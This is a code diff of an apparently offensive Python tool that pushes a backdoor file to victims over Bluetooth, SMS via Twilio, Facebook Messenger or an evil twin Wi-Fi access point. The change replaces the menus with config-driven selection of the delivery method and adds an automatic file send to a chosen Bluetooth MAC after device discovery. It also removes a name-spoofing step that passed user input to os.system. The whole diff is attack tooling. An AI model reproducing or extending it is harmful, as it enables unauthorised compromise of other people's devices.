@@ -16,11 +16,6 @@ import random
 import sys
 from ansi.colour import fg,bg 
 from colorama import Fore,Back,Style
-from bluetooth import *
-from PyOBEX.client import *
-from twilio.rest import *
-from fbchat.models import *
-import fbchat
 
 
 #
@@ -30,6 +25,20 @@ global config
 config = ConfigParser.ConfigParser()
 config.read("config.cfg")
 
+btActive = config.get("BT", "ACTIVE")
+smsActive = config.get("SMS", "ACTIVE")
+fbActive  = config.get("FB", "ACTIVE")
+
+if (btActive == 'TRUE' and smsActive == 'FALSE' and fbActive == 'FALSE'):
+	from bluetooth import *
+	from PyOBEX.client import *
+
+if (btActive == 'FALSE' and smsActive == 'TRUE' and fbActive == 'FALSE'):
+	from twilio.rest import *
+
+if (btActive == 'FALSE' and smsActive == 'FALSE' and fbActive == 'TRUE'):
+	from fbchat.models import *
+	import fbchat
 #
 # DEBUG: Symbols
 #
@@ -242,11 +251,6 @@ def Scan():
 
 		Print(CORRECT, "Interface is up ")
 
-		btName = raw_input("Type Your Bluetooth Name: ")
-		if (btName != ""):
-			Print(INFO, "Spoofing %s" % btName)
-			os.system("hciconfig name %s %s up" % (btName, interface))
-
 
 		try:
 			# Discover Devices.
@@ -269,6 +273,7 @@ def Scan():
 				mac = raw_input(Fore.BLUE + "[*] " + Fore.WHITE + "Select Bluetooth MAC: ")
 				while len(mac) == 0:
 					mac = raw_input(Fore.BLUE + "[*] " + Fore.WHITE + "Select Bluetooth MAC: ")
+			SendFile(mac)
 						
 
 		except OSError as e:
@@ -309,7 +314,7 @@ def SendFile (mac):
 
 		Print(INFO, "Waiting for backdoor creation")
 		CreateBackdoor()
-		time.sleep(10)
+		time.sleep(20)
 
 		# Read the file
 		payload = config.get("BACKDOOR","BACKDOOR_NAME")
@@ -488,178 +493,29 @@ def Banner():
 def Menu():
 
 	Banner()
-	print(Style.BRIGHT)
-	print(Fore.BLUE + "0x1" + Fore.WHITE + " Attack Via Bluetooth ")
-	print(Fore.BLUE + "0x2" + Fore.WHITE + " Attack Via SMS (Twilio) ")
-	print(Fore.BLUE + "0x3" + Fore.WHITE + " Attack Via FB (Facebook Messenger) ")
-	print(Fore.BLUE + "0x4" + Fore.WHITE + " Attack Via Evil Twin AP ")
-	print(Fore.BLUE + "0x5" + Fore.WHITE + " Exit ")
-	try:
-
-		cmd = raw_input(Fore.GREEN + "\nmenu" + Fore.WHITE + "#:> ")
-		ExecuteCommand(cmd, '1')
-
-	except KeyboardInterrupt:
-		Print(INFO, "Exiting... Happy Hacking")
-		sys.exit(0)
-
-#
-# FB Messenger Menu
-#	
-def SetupFB ():
-
-	Banner()
-	print(Style.BRIGHT)
-	print(Fore.BLUE + "0x1" + Fore.WHITE + " Send Evil FB Message ")
-	print(Fore.BLUE + "0x2" + Fore.WHITE + " Back")
-		
-	try:
-
-		cmd = raw_input(Fore.GREEN + "\nfacebook" + Fore.WHITE + "#:> ")
-		ExecuteCommand(cmd, '4')
-
-	except KeyboardInterrupt:
-		Print(INFO, "Exiting... Happy Hacking")
-		sys.exit(0)
-
-#
-# Evil Twin Menu
-#
-def SetupEvilTwin ():
-
-	Banner()
-	print(Style.BRIGHT)
-	print(Fore.BLUE + "0x1" + Fore.WHITE + " Create Evil AP ")
-	print(Fore.BLUE + "0x2" + Fore.WHITE + " Back")
-		
-	try:
-
-		cmd = raw_input(Fore.GREEN + "\neviltwin" + Fore.WHITE + "#:> ")
-		ExecuteCommand(cmd, '5')
-
-	except KeyboardInterrupt:
-		Print(INFO, "Exiting... Happy Hacking")
-		sys.exit(0)
-
-#
-# SMS Menu
-#
-def SetupSMS ():
-
-	Banner()
-	print(Style.BRIGHT)
-	print(Fore.BLUE + "0x1" + Fore.WHITE + " Send SMS ")
-	print(Fore.BLUE + "0x2" + Fore.WHITE + " Back")
-		
-	try:
-
-		cmd = raw_input(Fore.GREEN + "\nsms" + Fore.WHITE + "#:> ")
-		ExecuteCommand(cmd, '3')
-
-	except KeyboardInterrupt:
-		Print(INFO, "Exiting... Happy Hacking")
-		sys.exit(0)
-
-
-#
-# Bluetooth menu
-#
-def SetupBluetooth ():
-
-	Banner()
-	print(Style.BRIGHT)
-	print(Fore.BLUE + "0x1" + Fore.WHITE + " Start Interface ")
-	print(Fore.BLUE + "0x2" + Fore.WHITE + " Scan & Exploit ")
-	print(Fore.BLUE + "0x3" + Fore.WHITE + " Back")
-		
-	try:
-
-		cmd = raw_input(Fore.GREEN + "\nbluetooth" + Fore.WHITE + "#:> ")
-		ExecuteCommand(cmd, '2')
-
-	except KeyboardInterrupt:
-		Print(INFO, "Exiting... Happy Hacking")
-		sys.exit(0)
-
-
-#
-#Parses the commands for the menus.
-#
-def ExecuteCommand (cmd, menu):
-
-	if (menu == '1'):
-		if (cmd == '1'):
-			Banner()
-			SetupBluetooth()
-
-		if (cmd == '2'):
-			Banner()
-			SetupSMS()
-			Menu()
-
-		if (cmd == '3'):
-			Banner()
-			SetupFB()
-			Menu()
-
-		if (cmd == '4'):
-			Banner()
-			SetupEvilTwin()
-			Menu()
-
-		if (cmd == '5'):
-			Banner()
-			Print(INFO, "Exiting... Happy Hacking")
-			sys.exit(0)
-
-
-	if (menu == '2'):	
-		if (cmd == '1'):
-			Scan()
-
-
-		if (cmd == '2'):
-			try:
-
-				if (mac != None):
-					Print(CORRECT," Target - %s " % mac)
-			except NameError:
-				Print(ERROR, "Please Scan first")
-				SetupBluetooth()
-
-
-		if (cmd == '3'):
-			Menu()
-
-		try:
-
-			if (mac != None):
-				Print(CORRECT," Target - %s " % mac)
-		except NameError:
-			print(ERROR, "Please Scan first")
-			SetupBluetooth()
-
-	if (menu == '3'):
-		if (cmd == '1'):
-			Banner()
-			SendSMS()
-		if (cmd == '2'):
-			Menu()
-
-	if (menu == '4'):
-		if (cmd == '1'):
-			Banner()
-			SendToMessenger()
-		if (cmd == '2'):
-			Menu()
 	
+	btActive = config.get("BT", "ACTIVE")
+	smsActive = config.get("SMS", "ACTIVE")
+	fbActive  = config.get("FB", "ACTIVE")
+	apActive  = config.get("AP", "ACTIVE")
 
+	if (btActive == 'FALSE' and smsActive == 'FALSE' and fbActive == 'FALSE' and apActive == 'TRUE'):
+		Print(CORRECT, "Evil Twin Deployment Options ACTIVE")
+		EvilTwin()
 
-	if (menu == '5'):
-		if (cmd == '1'):
-			Banner()
-			EvilTwin()
-		if (cmd == '2'):
-			Menu()
+	elif (btActive == 'TRUE' and smsActive == 'FALSE' and fbActive == 'FALSE' and apActive == 'FALSE'):
+		Print(CORRECT, "Bluetooth Deployment Options ACTIVE")
+		Scan()
+
+	elif (btActive == 'FALSE' and smsActive == 'TRUE' and fbActive == 'FALSE' and apActive == 'FALSE'):
+		Print(CORRECT, "SMS Deployment Options ACTIVE")
+		SendSMS()
+
+	elif (btActive == 'FALSE' and smsActive == 'FALSE' and fbActive == 'TRUE' and apActive == 'FALSE'):
+		Print(CORRECT, "Facebook Deployment Options ACTIVE")		
+		SendToMessenger()
+
+	else:
+		Print(ERROR, "No Deployment Options ACTIVE")
+		return
 Menu()	
-
